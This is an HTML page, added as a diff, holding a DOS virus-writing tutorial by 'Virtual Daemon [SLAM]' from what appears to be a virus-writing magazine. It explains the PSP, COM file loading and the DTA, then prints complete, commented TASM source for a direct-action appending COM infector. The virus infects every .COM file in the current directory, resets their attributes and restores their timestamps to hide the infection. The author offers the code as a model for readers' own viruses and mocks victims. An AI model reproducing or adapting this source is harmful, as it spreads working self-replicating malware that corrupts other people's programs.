@@ -1,0 +1,443 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Direct COM infection tutorial</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+3>Direct COM infection
+tutorial<BR>
+</FONT><FONT SIZE=+2>by<BR>
+Virtual Daemon [SLAM]</FONT></FONT></B></P></CENTER>
+
+<PRE>
+<HR WIDTH="100%"></PRE>
+
+<UL>
+<PRE>  This tutorial is dedicated to all those people out there, who have learned
+how to make an overwritting virus and now they want more. So, if you already
+know how to build a shitty COM infector, get the hell out of here now! :) You
+are only wasting your time with this crap.
+  First of all I would like to say that COM viruses, are the lowest form of
+what we call a &quot;real PC virus&quot;. If you've read my tutorial from the previous
+issue of SLAM Magazine about overwritting virii, and U still think that over-
+writting virii are good, then U really suck! That tutorial and the OVCT kit
+are only for those ppl who either are stupid and don't understand how to build
+a simple COM infector, either for the people who are too lazy for coding
+virii, and they don't care if they destroy other's programs. Anyway, I
+received about 20 e-mails from people who told me that my <A HREF="creatrs2.htm#OVCT">OVCT</A> helped them in
+understanding virii, and in understanding the basics assembler stuff. Thx
+for mailing me, guys! This tutorial is for you! ;-)
+
+  Well, let's get started... First we'll begin with a brief discusion about
+the COM programs!
+
+  COM files are the simplest binary executable files. They are nothing else,
+but some memory images. When a COM program is executed, the DOS operating
+system will create a PSP (Program Segment Prefix).
+  The PSP is nothing else but a DOS structure of 256 bytes length, where the
+operating system will keep some important informations, like some interrups
+handlers or the command line parameters. When the COM program is actually
+beginning it's execution, the ds:0000 and es:0000 will represent the beginning
+address of the PSP.
+  The PSP musn't be so important for you right now, but anyway, I'll try to
+explain some of it's &quot;features&quot;... Maybe this way you'll get it better. And
+besides that, if you will learn about the PSP now, you wont have any trouble
+later when you will start coding your own virii.... So, here goes... ;)
+
+P.S.If you don't understand this or you think that this is too hard for you to
+understand right now, skip over, and read it later. Anyway, you will have to
+learn it sometime, either you like it or not... hehehe! :)
+
+The structure of the PSP looks like this:
+Offset   Size  Description
+------   ----  -----------
+  0h       2    INT 20h =  EXE programs may jump or ret here (PSP:0) to exit
+  2h       2    MemTop  =  top of available system memory in paragraphs
+  4h       1    DOS reserved area
+  5h       5    CALL offset segment =  FAR CALL to DOS function dispatcher
+ 0ah       4    offset segment    =    Terminate address (INT 22h)
+ 0eh       4    offset segment    =    Ctrl+Break handler address (INT 23h)
+ 12h       4    offset segment    =    Critical error handler address (INT 24h)
+ 16h      16h   DOS reserved area
+ 2ch       2    EnvSeg  =  Segment address of DOS environment
+ 2eh      2eh   DOS reserved area
+ 5ch      10h   formatted parm area 1 = setup as an FCB for 1st cmd parameter
+ 6ch      14h   formatted parm area 2 = setup as an FCB for 2nd cmd parameter
+ 80h       1    len        offset of default DTA, also count of chars in UPA
+ 81h      7fh   UPA (Unformatted Parm Area) = chars from DOS command line
+
+ Ok. Now let's explain what everything means...
+ 
+* The first 2 bytes from offset 0, contains the code of a INT 20h instruction
+(exit to DOS), which let any program to return to the operating system by
+JMP-ing to this address. This stuff is not used any more, bcoz the traditional
+method to return to the operating system is now &quot;mov ah,4ch/int 21h&quot;.
+
+* The next 2 bytes from offset 2, contains the available memory size in para-
+graphs. A paragraph contains 16 bytes. This information is used in the
+loading process of the executable file.
+
+* The byte from 4 is reserved for the operating system.
+
+* The 5 bytes from offset 5 contains the code of a CALL instruction (far) to
+the DOS dispatcher.
+
+* The next 4 bytes from offset 0ah contains a terminate address. This address
+can be accesed with INT 22h. Int 22h is another method for terminating a DOS
+program. Also, like Int 20h, Int 22h isn't used.
+
+* The 4 bytes from 0eh contains the address of Int 23h (Ctrl+Break address)
+vector. As you all know (I hope), Ctrl+Break causes a program to terminate
+imediatly. If Break variable (can be set from config.sys) is on, DOS will
+sense Ctrl+Break during all functions except 6h (console I/O) and 7h (no echo
+unfiltered console input). If Break is off, DOS will only sense Ctrl+Break
+during console, printer and serial device I/O.
+
+* The 4 bytes from offset 12h contains the critical error handler (INT 24h)
+address. The Int 24h interrupt is activated when a driver encounters a critical
+error.
+
+* The following 22 bytes (16h) from offset 16h are reserved for DOS.
+
+* The next 2 bytes from 2ch contains the segment address of the DOS
+environment (or paragraph number of the environment). The DOS environment is
+an area of memory smaller then 32K where all the PATH's and SET's are saved.
+All the informations from this area are stored in a set of ASCIIZ strings.
+
+* The next 46 bytes (2eh) from offset 2eh are reserved for DOS.
+
+* The next 16 bytes (10h) from offset 5ch contains the first command line
+parameter specified.
+
+* The next 20 byte (14h) from offset 6ch contains the 2nd command line param.
+
+* The following byte from 80h contains the length of the DOS command line
+in bytes. Also, at 80h is stored the offset of the default DTA (Disk Transfer
+address).
+
+* The next 127 bytes (7fh) stored from offset 81h contains the DOS command
+line. The first 43 bytes from offset 80h are used as the default DTA.
+
+  What do you have to learn from all this crap? One: in the PSP are stored
+important interrupt vectors such as Int 22h, Int 23h or Int 24h. Two: the PSP
+contains the DOS command line (program's parameters). Three: the PSP contains
+the amount of memory available for the program. Four: there are 0-2 FCB's for
+the file unopened. And five: the default DTA is stored at offset 80h of PSP.
+  If you know all this stuff, then you can use them properly in your virii.
+What's important for our direct COM virus right now,  is the DTA area (stored
+at 80h). I will explain the structure of DTA a little later, after I finish
+with the COM programs.
+
+  So, we've seen how the PSP looks. Like I told U before, the PSP is created
+by DOS when the program is executed. After that, the program will be loaded
+in memory right after the PSP (at 100h=256). So, the COM file starts at offset
+100h. Here's a little &quot;graphic&quot;:
+
+   CS:0000      .-------------.
+                |     PSP     |
+   CS:0100      .-------------.
+                |      .      | \
+                |      .      |  |-&gt; here goes the whole program
+                |      .      | /
+   CS:FFFE      .-------------.
+                |      0      |
+                '-------------'
+
+  The COM files can be run only in the current segment. The size of a segment
+is 64 KBytes. That means that the size of a COM file can't be bigger then
+64K-256(size of PSP)=65280. So, the file must have less then 65280-size of
+virus before infection. If we don't check for the size of the file, the PSP
+may get corrupted...
+
+  Ok. Now that I've explained you how a COM file is loaded, let's get to the
+fun part: our virus!
+
+  First, I'll try to explain what is the theory in infecting a COM file, and
+then I will show you the source code of a example virus.
+
+  We have several methods to infect a COM file. We can append our virus to the
+end of the file, we can save a number of bytes from the beginning to the end
+and then we can put our virus at the beginning of file OR we can put the virus
+anywhere in the file... The last method is the trickiest one, and it's used
+only for researching purposes. To make it work, you need to recalculate a lot
+of stuff.
+  I will try to talk about the 1st method (REAL appending), since this is more
+used then all the others.
+
+  For infecting a COM file, theoretically you need to change the first 3 bytes
+of the program with a JMP to your virus which will be appended at the end of
+the host program. Then, after the virus has been executed you need to restore
+the original 3 bytes in memory so the original program can run. This way your
+virus gets to be executed first, and then you will pass control to the original
+program which will run normaly.
+
+  Let's see how the program is gonna look after infection:
+  Begin:
+     Jmp virus          ;jump to our virus
+  Real_program:         ;here begins the real program
+     .
+     .
+     .
+     .
+  Virus:                ;our virus
+     ..
+     ..
+     ..
+     Jmp Real_program   ;pass control to the original program
+
+  Okie, dokie! So, we have seen how your infected file is gonna look like...
+Before jumping into the infecting method, I must show you the structure of
+DTA (well, I think I already did it in my Overwritting Tut, but what the
+hell? ;)...
+
+  Offset   Size   Description
+  ------   ----   -----------
+    0       21    reserved area  = used in subsequent calls to 4fh function
+   15h       1    attr           = file attributes
+   16h       2    time           = time of file created/last modified
+   18h       2    date           = date of file created/last modified
+   1ah       4    size           = file size in bytes
+   1eh      13    name           = file name (13 bytes ASCIIZ filespec)
+
+   Well, enough with the theory bullshit! Let's get to some action!!! ;-))
+
+   Steps in creating a direct action appending COM infector:
+1) Calculate the Delta-offset
+2) Restore the original 3 bytes
+3) Set a new DTA
+4) Find a file to infect
+  - if no files found then go to 20
+  - else continue
+5) Save original file attributes (optional)
+6) Reset attributes to archive
+7) Open file for RW and put handle in BX
+  - if error then go to 18
+  - else continue
+8) Save original file time/date (optional)
+9) Read the 1st 3 bytes from file
+10) Check if already infected
+  - if infected then go to 17
+  - else continue
+11) Prepare the JMP
+12) Go to beginning of file
+13) Write new JMP
+14) Go to end of file
+15) Write the virus
+16) Restore original file time/date (optional)
+17) Close the file
+18) Restore original file attributes (optional)
+19) Find another file to infect
+  - if no files found then go to 20
+  - else jump to 5
+20) Restore original DTA
+21) Restore to host
+
+   These are the steps in creating a direct COM infector. Note that this is
+not the simples COM infector! It contains a little more instruction then the
+simplest direct action infector! This virus will search the current directory
+and will infect all files found. It will also save/restore file time/date/
+attributes. And, it will check if the file is already infected.
+
+   I wont take all the steps one by one with the appropriate asm function,
+bcoz, after reading my Overwritting Tut, you're suppose to know what function
+to use for finding a file or for opening one... Anyway, I WILL comment as much
+as I can the example virus. It's a very simple COM infector. I suggest you to
+use it from now on, as your model...
+
+   Ok. Here's the source code... The source will show you the basics in
+creating a simple COM infector. You can do whatever you want with it...
+   Read it, like it, love it, eat it! ;-)
+   
+   Oh,  btw: DO NOT SPREAD SHIT LIKE THIS!!! Wait till you're gonna do at least
+a TSR virus.... ;)
+
+   Well, enjoy reading!   See ya' later dude!  Peace!   O:-)
+
+<B>---------- cut here ----------
+</B>; Virus Name: Example
+; Virus Type: Direct appending COM infector
+; Comments: - the virus will search and infect all the COM files from current
+;             directory
+;           - will check if a file has been already infected or not
+;           - will save/restore file time/date/attributes
+; Assemble with: tasm example.asm
+;                tlink /t example.obj
+;
+code segment
+   assume cs:code,ds:code
+   org 100h                     ;starts at 100h =&gt; COM File
+
+begin:
+   db 0e9h                      ;jmp start ('db 0e9h' contains the JMP code)
+   dw 0                         ;'dw 0' containts the offset (where to JMP)
+
+start:
+   call find_offset             ;must find out the real delta offset
+find_offset:
+;calculate the delta offset
+   pop bp                       ;bp holds IP
+   sub bp,offset find_offset    ;find the delta offset (BP='delta offset' now)
+
+;restore the original 3 bytes in memory
+   lea si,[bp+jmpbuf]           ;change the first 3 bytes to original
+   mov di,100h                  ;100h=where the program begins
+   push di                      ;save di=100h for retn (return to program)
+   movsw                        ;move a word from ds:si in memory \
+                                ;                                  |=&gt; 3 bytes
+   movsb                        ;move a byte -------- &quot; &quot; ------- /
+
+;set a new DTA buffer. Note that the size of DTA is 42 bytes.
+   lea dx,[bp+dta]              ;set a new DTA buffer
+   mov ah,1ah                   ;DOS function=Set Disk Transfer Address
+   int 21h
+
+find_file:
+;find a file to infect
+   mov ah,4eh                   ;DOS function=Find 1st Matching File
+   mov cx,7                     ;any file attribute
+   lea dx,[bp+filespec]         ;search for &quot;filespec&quot; files only (.COM)
+again:                          ;label for find next
+   int 21h
+   jnc get_atributes            ;if no error encountered go further
+   jmp quit                     ;else return to host
+
+get_atributes:
+;well like I said before, the name of the file is stored in DTA at 1eh (30)
+   lea dx,[bp+dta+1eh]          ;dx holds the name of the file
+   xor ch,ch
+   mov cl,[bp+offset dta+15h]   ;get file attributes from DTA
+   mov byte ptr[bp+file_attr],cl       ;save them into file_attr variable
+
+set_atributes:
+;set archive only attribute to file, so we can infect it. We can't infect a
+;read only file unless we do this stuff.
+   mov ax,4301h                 ;DOS function=Set File Attribute
+   xor cx,cx                    ;cx=0 =&gt; file attribute=normal file
+   int 21h
+open_file:
+;open the file for infection (read + write)
+   mov ax,3d02h                 ;DOS function=Open a File (for R &amp; W)
+   lea dx,[bp+dta+1eh]          ;dx holds the name of the file
+   int 21h
+   jnc prepare_infection        ;if file was opened go to infection part
+   jmp put_old_atributes        ;else go and put old atributes back
+prepare_infection:
+;the open function will return the file handle in ax, BUT all the other
+;functions need it in bx, so we have to change the content of ax with bx
+   xchg bx,ax                   ;change bx with ax
+
+;save original file time/date. This is necessary if we want to cover our tracks
+;At the end of the virus, we'll restore this values, so the user will think
+;that this was the last time his file got modified. hehehe...Stupid lamers! ;)
+   mov ax,5700h                 ;DOS function=Get File Time/Date
+   int 21h
+   mov word ptr [bp+file_time],cx     ;save old time in file_time
+   mov word ptr [bp+file_date],dx     ;save old date in file_date
+check:
+;read the 1st 3 bytes from file to check if the file has been already infected
+   mov ah,3fh                   ;DOS function=Read from File
+   lea dx,[bp+jmpbuf]           ;save them into jmpbuf
+   mov cx,3                     ;read 3 bytes
+   int 21h
+
+   mov ax,word ptr [bp+dta+26]        ;Get filesize from DTA in ax
+;after the following instruction, the cx register will contain the size of the
+;file before infection... Why? Because our virus was suppose to jump to the
+;end of the file, where it's code was stored... :)
+   mov cx,word ptr [bp+jmpbuf+1]
+   add cx,heap-start+3          ;cx=filesize-virus+3
+   cmp cx,ax                    ;compare the 2 values
+;if the 2 values are equal, the file has been already infected
+   jne infect                   ;if not equal then infect file
+   jmp close_file               ;else close_file
+
+infect:
+;the following 4 lines will prepare the JMP code which will be placed at the
+;beginning of the file. Note that the 1st byte is the JMP code (0e9h) and the
+;next 2 bytes are the offset (the adress where to jump).
+   mov byte ptr[bp+buffer],0e9h       ;JMP code
+   mov ax,word ptr[bp+dta+26]         ;get file size
+   sub ax,3                           ;ax=filesize-3 (size of JMP)
+   mov word ptr[bp+buffer+1],ax       ;offset of JMP
+
+;here we seek to the beginning of file
+   mov ax,4200h                 ;DOS function=Set File Pointer
+   xor cx,cx                    ;go to beginning of file (BOF)
+   xor dx,dx
+   int 21h
+
+;write the new JMP instruction which will jump to our virus when the file gets
+;executed
+   mov ah,40h                   ;DOS function=Write to File
+   mov cx,3                     ;write 3 bytes to beginning of file
+   lea dx,[bp+buffer]           ;from buffer
+   int 21h
+
+;seek to end of the file
+   mov ax,4202h                 ;DOS function=Set File Pointer
+   xor cx,cx                    ;go to end of file (EOF)
+   xor dx,dx
+   int 21h
+
+;write the whole virus code
+   mov ah,40h                   ;DOS function=Write to File
+   mov cx,heap-start            ;size of virus
+   lea dx,[bp+start]            ;from beginning
+   int 21h
+
+close_file:
+;restore original file time/date values
+   mov dx,word ptr [bp+file_date]     ;dx=original date value
+   mov cx,word ptr [bp+file_time]     ;cx=original time value
+   mov ax,5701h                 ;DOS function=Set File Time/Date
+   int 21h
+
+;close the file
+   mov ah,3eh                   ;DOS function=Close File
+   int 21h
+put_old_atributes:
+;restore the original file attributes
+   mov ax,4301h                 ;DOS function=Set File Attribute
+   lea dx,[bp+offset dta+1eh]   ;dx=file name
+   xor ch,ch
+   mov cl,byte ptr [bp+file_attr]     ;cl=original file attribute
+   int 21h
+find_next:
+;search for another file to infect
+   mov ah,4fh                   ;DOS funtion=Find Next Matching File
+   jmp again                    ;do it!
+
+quit:
+;restore the default DTA
+   mov dx,80h   ;change the DTA to original (DTA is stored at 80h in the PSP)
+   mov ah,1ah   ;DOS function=Set Disk Transfer Address
+   int 21h
+
+   retn         ;pass control to the host program in memory
+
+jmpbuf           db 0cdh,20h,0          ;=int 20h
+filespec         db '*.com',0           ;what kind of files to search
+virus_sign       db 'Direct-COM'        ;name of the virus. Kinda cool, ha? ;)
+
+heap:
+dta        db 43 dup (?)                ;our new DTA buffer
+file_attr  db ?                         ;original file attributes
+file_time  dw ?                         ;original file time
+file_date  dw ?                         ;original file date
+buffer     db 3 dup(?)                  ;3 bytes buffer. Used for checking
+                                        ;if the file was already infected.
+code ends
+end begin
+<B>---------- cut here ----------
+
+</B>  You can reach me via e-mail at: <A HREF="mailto:virtual_daemon@hotmail.com">virtual_daemon@hotmail.com</A></PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%">
+</PRE>
+
+</BODY>
+</HTML>
